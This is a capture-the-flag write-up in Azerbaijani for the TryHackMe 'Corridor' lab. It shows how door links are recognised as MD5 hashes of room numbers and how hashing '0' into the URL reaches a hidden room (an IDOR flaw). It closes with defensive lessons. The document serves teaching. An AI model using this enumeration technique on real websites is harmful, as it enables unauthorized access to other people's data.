# TryHackMe — Corridor Writeup (Azərbaycan dilində)

## Ümumi Məlumat

| | |
|---|---|
| **Platforma** | TryHackMe |
| **Lab adı** | Corridor |
| **Çətinlik** | Easy |
| **Mövzu** | IDOR (Insecure Direct Object Reference) |
| **Link** | https://tryhackme.com/room/corridor |

---

## Zəiflik Nədir?

Bu lab **IDOR (Insecure Direct Object Reference)** zəifliyini öyrədir.

IDOR — istifadəçinin URL-i dəyişdirərək icazəsi olmayan resurslara giriş edə bilməsidir. Bu halda server istifadəçinin həqiqətən həmin resursa giriş hüququ olub-olmadığını yoxlamır.

---

## Kəşfiyyat (Reconnaissance)

Maşını başlatdıqdan sonra verilən IP-ni brauzerdə açırıq. Qarşımıza bir koridor şəkli çıxır. Hər qapıya kliklədikdə URL dəyişir:

```
http://10.10.x.x/c4ca4238a0b923820dcc509a6f75849b
```

Səhifənin HTML koduna baxırıq (`Ctrl+U`):

```html
<area href="c4ca4238a0b923820dcc509a6f75849b" ...>
<area href="c81e728d9d4c2f636f067f89cc14862c" ...>
<area href="eccbc87e4b5ce2fe28308fd9f2a7baf3" ...>
...
```

---

## Analiz

Bu dəyərlər **MD5 hash**-ləridir. Onları crack edirik:

| Hash | Dəyər |
|---|---|
| c4ca4238a0b923820dcc509a6f75849b | 1 |
| c81e728d9d4c2f636f067f89cc14862c | 2 |
| eccbc87e4b5ce2fe28308fd9f2a7baf3 | 3 |
| a87ff679a2f3e71d9181a67b7542122c | 4 |
| e4da3b7fbbce2345d7772b0674a318d5 | 5 |
| 1679091c5a880faf6fb5e6087eb1b2dc | 6 |
| 8f14e45fceea167a5a36dedd4bea2543 | 7 |
| c9f0f895fb98ab9159f51fd0297e236d | 8 |
| 45c48cce2e2d7fbdea1afc51c7c6ad26 | 9 |
| d3d9446802a44259755d38e6d163e820 | 10 |
| 6512bd43d9caa6e02c990b0a82652dca | 11 |
| c20ad4d76fe97759aa27a0c99bff6710 | 12 |
| c51ce410c124a10e0db5e4b97fc2af39 | 13 |

Qapılar **1-dən 13-ə** qədər otaq nömrələrini təmsil edir. Bəs **0** nömrəli otaq?

---

## İstismar (Exploitation)

**0** ədədinin MD5 hash-ini hesablayırıq:

```
MD5("0") = cfcd208495d565ef66e7dff9f98764da
```

Bu hash-i URL-də istifadə edirik:

```
http://10.10.x.x/cfcd208495d565ef66e7dff9f98764da
```

---

## Nəticə

URL-i dəyişdirdikdən sonra gizli otağa daxil oluruq və flag əldə edirik:

```
Flag: THM{****************************}
```

---

## Öyrəndiklərimiz

- **IDOR** zəifliyi server tərəfindən düzgün icazə yoxlanışı olmadıqda yaranır
- **MD5** kriptoqrafik hash funksiyasıdır — lakin məlum dəyərlərin hash-lərini tapmaq asandır
- Gizli resurslar yalnız URL-i dəyişdirməklə tapıla bilər
- Təhlükəsiz proqram təminatı üçün server tərəfində mütləq icazə yoxlanışı edilməlidir

---

## Müdafiə Tədbirləri

Belə zəifliklərdən qorunmaq üçün:

1. Server tərəfində hər sorğu üçün icazə yoxlanışı aparılmalıdır
2. Gizli resurslara keçid üçün təsadüfi və uzun tokenlərdən istifadə edilməlidir
3. MD5 kimi zəif hash funksiyaları identifikator kimi istifadə edilməməlidir
